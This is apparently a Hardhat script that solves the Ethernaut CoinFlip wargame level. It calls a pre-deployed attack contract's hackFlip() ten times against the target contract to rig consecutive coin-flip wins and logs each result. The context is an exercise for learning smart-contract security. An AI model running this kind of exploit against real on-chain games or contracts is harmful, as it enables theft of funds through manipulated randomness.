import { ethers } from 'hardhat';
import { HackCoinFlip__factory } from '../../typechain';
import { getRemoteContract } from './helpers';

async function main() {
    const [owner] = await ethers.getSigners();

    // Our new (pre-)deployed contract. Deployed with:
    //     const token = await new HackCoinFlip__factory(owner).deploy();
    const hackAddress = "0xA367ECC269f101aD62D451DE79D840c06f4d892A"; // CoinFlipHack
    const hackContract = HackCoinFlip__factory.connect(hackAddress, owner);   

    // The deployed contract from Ethernaut
    const flipAddress = "0x70197B52f343E099c4B8DC3767f69Af11E68a98C"; // coinFlip
    const flipContract = await getRemoteContract(flipAddress);

    console.log("BEFORE Consecutive Wins == ", await flipContract.consecutiveWins());   

    // ethers failed to estimate the gas correctly on each attempt - so do it once then pass it through.
    const gasLimit = await hackContract.estimateGas.hackFlip();

    for (var _i = 0; _i < 10; _i++) {
        console.log("\nITERATION", _i);
        const tx = await hackContract.hackFlip({gasLimit: gasLimit});
        console.log(tx);
        console.log(await tx.wait());  // Wait for the hackFlip() tx to be mined.
        console.log("AFTER Consecutive Wins == ", await flipContract.consecutiveWins());
    }

    console.log("\nFINAL Consecutive Wins == ", await flipContract.consecutiveWins());
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });